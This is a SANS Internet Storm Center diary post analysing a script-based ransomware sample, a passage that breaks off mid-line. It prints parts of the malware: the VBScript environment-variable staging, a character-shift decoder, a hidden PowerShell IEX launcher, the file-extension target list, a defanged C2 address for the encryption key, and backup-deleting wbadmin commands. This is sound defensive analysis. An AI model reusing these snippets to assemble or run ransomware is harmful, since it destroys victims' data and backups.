---
title: Another Script-Based Ransomware, (Wed, Nov 9th)
url: https://isc.sans.edu/diary/rss/29234
source: SANS Internet Storm Center, InfoCON: green
date: 2022-11-10
fetch_date: 2025-10-03T22:17:36.276013
---

# Another Script-Based Ransomware, (Wed, Nov 9th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/29230)
* [next](/diary/29238)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [Another Script-Based Ransomware](/forums/diary/Another%2BScriptBased%2BRansomware/29234/)

**Published**: 2022-11-09. **Last Updated**: 2022-11-09 02:27:20 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[1 comment(s)](/diary/Another%2BScriptBased%2BRansomware/29234/#comments)

In the past, I already found some script-based ransomware samples written in Python or Powershell[[1](https://isc.sans.edu/diary/Simple%2BPowershell%2BRansomware%2BCreating%2Ba%2B7Z%2BArchive%2Bof%2Byour%2BFiles/27286)]. The last one I found was only a “proof-of-concept” (my guess) but it demonstrates how easy such malware can be developed and how they remain undetected by most antivirus products.

I found a malicious VisualBasic script that attracted my attention. The SHA256 is 8c8ed4631248343f8732a83193828471e005900fbaf144589d57f6900b9c8996 and its VT score is only 3/57![[2](https://www.virustotal.com/gui/file/8c8ed4631248343f8732a83193828471e005900fbaf144589d57f6900b9c8996/details)]. It's no flagged as malicious but, even more, it’s reported as a simple mallicious script.

The obfuscation technique used is simple but pretty effective: The VBS creates a bunch of environment variables that contains encrypted PowerShelll code:

```

Set osi = CreateObject("Wscript.shell")
Set wev = osi.Environment("Process")
wev("XXX0") = "JGVuY3J5cHRlZD0iNzY0OTJ….”
wev("XXX1") = "QXhBRElBTndCbUFHUUFNQUExQURJQVpnQX…”
```

The Environment() parameter specifies the location of the environment variable. In this case, “Process” means that environment variables will be passed to child processes (and not stored in the registry). In this case, it will make the variables available to the second stage, the PowerShell script. In total, 80 “XXX” variables are created. The code to launch the next stage is obfuscated in a long string:

```

txt = "srzhuvkhoo#0qrh{lw#0ZlqgrzVw|oh#Klgghq#0f#%Lh[#+^V|vwhp1Wh{w1Hqfrglqj`==DVFLL1JhwVwulqj+^v|vwhp1Frqyhuw`==IurpEdvh97Vwulqj+'hqy=[[[3.'hqy=[[[4.'hqy=[[[5.'hqy=[[[6.'hqy=[[[7.'hqy=[[[8.'hqy=[[[9.'hqy=[[[:.'hqy=[[[;.'hqy=[[[<.'hqy=[[[43.'hqy=[[[44.'hqy=[[[45.'hqy=[[[46.'hqy=[[[47.'hqy=[[[48.'hqy=[[[49.'hqy=[[[4:.'hqy=[[[4;.'hqy=[[[4<.'hqy=[[[53.'hqy=[[[54.'hqy=[[[55.'hqy=[[[56.'hqy=[[[57.'hqy=[[[58.'hqy=[[[59.'hqy=[[[5:.'hqy=[[[5;.'hqy=[[[5<.'hqy=[[[63.'hqy=[[[64.'hqy=[[[65.'hqy=[[[66.'hqy=[[[67.'hqy=[[[68.'hqy=[[[69.'hqy=[[[6:.'hqy=[[[6;.'hqy=[[[6<.'hqy=[[[73.'hqy=[[[74.'hqy=[[[75.'hqy=[[[76.'hqy=[[[77.'hqy=[[[78.'hqy=[[[79.'hqy=[[[7:.'hqy=[[[7;.'hqy=[[[7<.'hqy=[[[83.'hqy=[[[84.'hqy=[[[85.'hqy=[[[86.'hqy=[[[87.'hqy=[[[88.'hqy=[[[89.'hqy=[[[8:.'hqy=[[[8;.'hqy=[[[8<.'hqy=[[[93.'hqy=[[[94.'hqy=[[[95.'hqy=[[[96.'hqy=[[[97.'hqy=[[[98.'hqy=[[[99.'hqy=[[[9:.'hqy=[[[9;.'hqy=[[[9<.'hqy=[[[:3.'hqy=[[[:4.'hqy=[[[:5.'hqy=[[[:6.'hqy=[[[:7.'hqy=[[[:8.'hqy=[[[:9.'hqy=[[[::.'hqy=[[[:;.'hqy=[[[:<.'hqy=[[[;3,,,>"
```

The decoding process is performed through a simple function which extracts the right characters:

```

function decode(s)
    For i = 1 To Len(s)
        newtxt = Mid(s,i,1)
        newtxt = Chr(Asc(newtxt) - 3)
        coded = coded + (newtxt)
    Next
    decode = coded
End function
```

Each character is shifted by 3: ’s’ becomes ‘p’, ‘r’ becomes ‘o’, etc. You may guess that it starts with "powershell".

Here is the executed script with the 80 environment variables created above:

```

powershell.exe" -noexit -WindowStyle Hidden -c "IeX ([System.Text.Encoding]::ASCII.GetString([system.Convert]::FromBase64String($env:XXX0+$env:XXX1+$env:XXX2+$env:XXX3+$env:XXX4+$env:XXX5+$env:XXX6+$env:XXX7+$env:XXX8+$env:XXX9+$env:XXX10+$env:XXX11+$env:XXX12+$env:XXX13+$env:XXX14+$env:XXX15+$env:XXX16+$env:XXX17+$env:XXX18+$env:XXX19+$env:XXX20+$env:XXX21+$env:XXX22+$env:XXX23+$env:XXX24+$env:XXX25+$env:XXX26+$env:XXX27+$env:XXX28+$env:XXX29+$env:XXX30+$env:XXX31+$env:XXX32+$env:XXX33+$env:XXX34+$env:XXX35+$env:XXX36+$env:XXX37+$env:XXX38+$env:XXX39+$env:XXX40+$env:XXX41+$env:XXX42+$env:XXX43+$env:XXX44+$env:XXX45+$env:XXX46+$env:XXX47+$env:XXX48+$env:XXX49+$env:XXX50+$env:XXX51+$env:XXX52+$env:XXX53+$env:XXX54+$env:XXX55+$env:XXX56+$env:XXX57+$env:XXX58+$env:XXX59+$env:XXX60+$env:XXX61+$env:XXX62+$env:XXX63+$env:XXX64+$env:XXX65+$env:XXX66+$env:XXX67+$env:XXX68+$env:XXX69+$env:XXX70+$env:XXX71+$env:XXX72+$env:XXX73+$env:XXX74+$env:XXX75+$env:XXX76+$env:XXX77+$env:XXX78+$env:XXX79+$env:XXX80)));
```

To extract the Base64 data from the VB script, we can use base64dump:

```

remnux@remnux:/MalwareZoo/20221107$ base64dump.py 8c8ed4631248343f8732a83193828471e005900fbaf144589d57f6900b9c8996.vir -n 100 -s a -d >payload.vir
```

The code contains an “encrypted” variable that contains the next stage. It will be decrypted and passed to IEX to launch the real malware:

```

function hei($encrypt){
    $sipped = [system.Convert]::FromBase64String($encrypt);
    $unsipped = gdba($sipped);
    $sclipt = [System.Text.Encoding]::ASCII.GetString($unsipped);
    iex($sclipt);
}
$Key = Set-SecretKey -Key "YRTWHTRJUUYUYRKB";
$DecryptedData = Get-EncryptedData -Key $Key -TextInput $encrypted;
hei $DecryptedData
```

I won't cover all the PowerShell code. Here are some capabilities of the ransomware launched via Invoke-Expression:

* It has a kill-switch (exits if the directory $env:PUBLIC + "\OracleKit exists)
* Targeted file extensions are:

```

"*.mp4","*.sql","*.7z","*.rar","*.m4a","*.wma","*.avi","*.wmv","*.csv","*.d3dbsp","*.zip","*.sie","*.sum","*.ibank",
"*.t13","*.t12","*.qdf","*.gdb","*.tax","*.pkpass","*.bc6","*.bc7","*.bkp","*.qic","*.bkf","*.sidn","*.sidd","*.mddata",
"*.itl","*.itdb","*.icxs","*.hvpl","*.hplg","*.hkdb","*.mdbackup","*.syncdb","*.gho","*.cas","*.svg","*.map","*.wmo",
"*.itm","*.sb","*.fos","*.mov","*.vdf","*.ztmp","*.sis","*.sid","*.ncf","*.menu","*.layout","*.dmp","*.blob","*.esm",
"*.vcf","*.vtf","*.dazip","*.fpk","*.mlx","*.kf","*.iwd","*.vpk","*.tor","*.psk","*.rim","*.w3x","*.fsh","*.ntl",
"*.arch00","*.lvl","*.snx","*.cfr","*.ff","*.vpp_pc","*.lrf","*.m2","*.mcmeta","*.vfs0","*.mpqge","*.kdb","*.db0",
"*.dba","*.rofl","*.hkx","*.bar","*.upk","*.das","*.iwi","*.litemod","*.asset","*.forge","*.ltx","*.bsa","*.apk",
"*.re4","*.sav","*.lbf","*.slm","*.bik","*.epk","*.rgss3a","*.pak","*.big","*wallet","*.wotreplay","*.xxx","*.desc",
"*.py","*.m3u","*.flv","*.js","*.css","*.rb","*.png","*.jpeg","*.txt","*.p7c","*.p7b","*.p12","*.pfx","*.pem","*.crt",
"*.cer","*.der","*.x3f","*.srw","*.pef","*.ptx","*.r3d","*.rw2","*.rwl","*.raw","*.raf","*.orf","*.nrw","*.mrwref",
"*.mef","*.erf","*.kdc","*.dcr","*.cr2","*.crw","*.bay","*.sr2","*.srf","*.arw","*.3fr","*.dng","*.jpe","*.jpg",
"*.cdr","*.indd","*.ai","*.eps","*.pdf","*.pdd","*.psd","*.dbf","*.mdf","*.wb2","*.rtf","*.wpd","*.dxg","*.xf","*.dwg",
"*.pst","*.accdb","*.mdb","*.pptm","*.pptx","*.ppt","*.xlk","*.xlsb","*.xlsm","*.xlsx","*.xls","*.wps","*.docm",
"*.docx","*.doc","*.odb","*.odc","*.odm","*.odp","*.ods","*.odt"
```

* A random extension is generated for encrypted files:

```

$extension = ([string][guid]::NewGuid()).Substring(0,6);
```

* Only drives with enough storage are targeted:

```

$drive = Get-PSDrive|Where-Object {$_.Free -gt 50000}|Sort-Object -Descending;
```

* The C2 server (that will get the encryption key) is hxxp://8619f595a0bd[.]ngrok[.]io/. (The tunnel is down at the moment)
* System is cleaned to prevent a quick restore:

```

execCmd('wbadmin delete catalog -quiet');
execCmd('wbadmin delete systemstatebackup');
execCmd('wbadmin...